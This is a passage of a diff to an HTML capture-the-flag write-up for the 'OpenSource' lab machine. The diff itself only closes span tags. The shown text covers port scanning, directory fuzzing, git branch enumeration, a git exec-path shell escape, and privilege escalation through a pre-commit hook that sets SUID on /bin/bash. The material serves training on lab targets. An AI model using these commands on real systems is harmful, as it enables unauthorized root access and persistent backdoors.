@@ -70,7 +70,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done -- 1 IP address (1 host up) scanned in 96.61 seconds
 </code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open. Port 3000 is filtered.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>http://10.10.11.164</code>, we will see a page like this:</p><p><img alt="OpenSource index" src="/images/HTB/OpenSource/OpenSource-index.webp"></p><p>Scrolling through the page, we can download the source code for part of the web application:</p><p><img alt="OpenSource download" src="/images/HTB/OpenSource/OpenSource-download.webp"></p><p>This web application is shown in <code>/upcloud</code>:</p><p><img alt="OpenSource upcloud" src="/images/HTB/OpenSource/OpenSource-upload.webp"></p><p>First of all, let&rsquo;s apply some fuzzing to enumerate more routes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.164/FUZZ
 <span class="code-dark-green">download                [Status: 200, Size: 2489147, Words: 9473, Lines: 9803, Duration: 155ms]</span>  
-<span class="code-dark-green">console                 [Status: 200, Size: 1563, Words: 330, Lines: 46, Duration: 45ms]
+<span class="code-dark-green">console                 [Status: 200, Size: 1563, Words: 330, Lines: 46, Duration: 45ms]</span>
 </code></pre></div><p>There is <code>/console</code>, which is really interesting if we had the PIN, but we don&rsquo;t:</p><p><img alt="OpenSource console" src="/images/HTB/OpenSource/OpenSource-console.webp"></p><p>There are ways to compute the PIN if we have access to some specific files of the server (more information <a target="_blank" href="https://www.daehee.com/werkzeug-console-pin-exploit/">here</a>).</p><h3 id="git-enumeration">Git enumeration</h3><p>So, let&rsquo;s analyze the given source code. First of all, we have these files and directories:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tree</span> -a -L 1
 .
 ├── .git
@@ -109,7 +109,7 @@ Date:   Thu Apr 28 13:45:17 2022 +0200
  CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
 </code></pre></div><p>Nothing useful at all. Let&rsquo;s see if we have more branches:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> branch  
   dev
-* <span class="code-dark-green">public
+* <span class="code-dark-green">public</span>
 </code></pre></div><p>There&rsquo;s a branch called <code>dev</code>, let&rsquo;s switch to that and enumerate old commits again:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> checkout dev
 Cambiado a rama 'dev'
 
@@ -526,7 +526,7 @@ Git hooks are merely shell scripts and in the following example the hook associa
 
 <span class="code-cyan">TF=$(mktemp -d)</span>
 <span class="code-cyan">ln -s /bin/sh "$TF/git-x"</span>
-<span class="code-cyan">git "--exec-path=$TF" x
+<span class="code-cyan">git "--exec-path=$TF" x</span>
 </code></pre></div><p>Alright, so we must enter a command in a file called <code>pre-commit</code> (without <code>.sample</code> suffix) inside <code>.git/hooks</code>. For instance, let&rsquo;s add SUID permissions to <code>/bin/bash</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev01@opensource</span>:<span class="code-blue">/tmp</span>$ echo 'chmod 4755 /bin/bash' &gt; ~/.git/hooks/pre-commit  
 <span class="code-green">dev01@opensource</span>:<span class="code-blue">/tmp</span>$ chmod +x ~/.git/hooks/pre-commit
 <span class="code-green">dev01@opensource</span>:<span class="code-blue">/tmp</span>$ ls -l /bin/bash
